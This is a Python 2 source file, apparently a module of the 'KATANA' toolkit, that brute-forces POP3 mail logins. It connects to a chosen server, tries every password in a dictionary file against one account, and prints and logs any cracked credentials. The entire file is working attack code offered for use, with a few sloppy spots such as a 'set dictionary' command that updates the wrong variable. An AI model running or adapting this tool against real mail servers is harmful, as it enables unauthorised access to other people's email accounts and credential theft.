# KATANA
# POP3 Brute Force
# Script by RedToor
# 22/05/2015

from core import help
import time
import poplib
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defaulthost="localhost"
defaultport="110"
defaultaccount="admin@target.con"
defaultdic2="core/db/pass.dicc"
def btpop3():
	try:
		global defaulthost,defaultport,defaultdic1,defaultdic2,defaultaccount
		actions = raw_input(O+"     ktn/bt/pop3 > "+W)
		if actions == "show options":
			print ""
			print "     ["+R+"+"+W+"] options"
			print "     |target         : yes"
			print "     |port           : no/yes"
			print "     |account        : yes"
			print "     |dictionaries   : no/yes\n"
			print ""
			print "     ["+G+"+"+W+"] options current"
			print "     |target         : ",defaulthost
			print "     |port           : ",defaultport
			print "     |account        : ",defaultaccount
			print "     |dictionary     : ",defaultdic2
			print ""
			btpop3()
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
			btpop3()
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
			btpop3()
		elif actions[0:14] == "set dictionary":
				defaultdic1 = actions[17:]
				print "     dictionary     : "+defaultdic2+" "+O+"     Saved!!!"+W
				btpop3()
		elif actions[0:11] == "set account":
				defaultaccount = actions[12:]
				print "     account        : "+defaultaccount+" "+O+"     Saved!!!"+W
				btpop3()
		elif actions=="back":
			return 
		elif actions=="exit":
			print C+"     GooD"+W+" bye."
			exit()
		elif actions == "help":
			help.help()
		elif actions == "run":
			print("\n     ["+O+"!"+W+"] Checking file")
			if True:
				if True:
					print "     ["+G+"+"+W+"] options current"
					print "     target         : ",defaulthost
					print "     port           : ",defaultport
					print "     account        : ",defaultaccount
					print "     dictionary     : ",defaultdic2
					print ""
					try:
						red=poplib.POP3(defaulthost, defaultport)
						if True:
							print("     ["+G+"+"+W+"] target LIVE")
							print("     ["+G+"+"+W+"] Running")
							try:
								with open(defaultdic2,'r') as passs:
									for ps in passs: 
										ps=ps.replace("\n","")
										try:
											red.user(defaultaccount)
											red.pass_(ps)
											if True:
												log=open('core/logs/logsBruteForce.log','a')
												log.write('\n ===================================== ')
												log.write('\n Module  : BruteForcePOP3')
												log.write('\n Data    : '+time.strftime('%c'))
												log.write('\n target  : '+defaulthost)
												log.write('\n port    : '+defaultport)
												log.write('\n account : '+defaultaccount)
												log.write('\n Cracked : username : '+defaultaccount+' , password : '+ps)
												log.close()
												print "     ["+G+"+"+W+"] Successfully with username : "+defaultaccount+" , password : "+ps+"\n"
												return 1
										except(KeyboardInterrupt, SystemExit):
											print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
										except:
											print "     ["+O+"!"+W+"] Checking with username : "+defaultaccount+" , password : "+ps						
							except(KeyboardInterrupt, SystemExit):
								print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
					except:
						print("     ["+R+"-"+W+"] target off")
		else:
			print "     ["+O+"!"+W+"] command No Accept"+W
	except(KeyboardInterrupt, SystemExit):
		print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
	btpop3()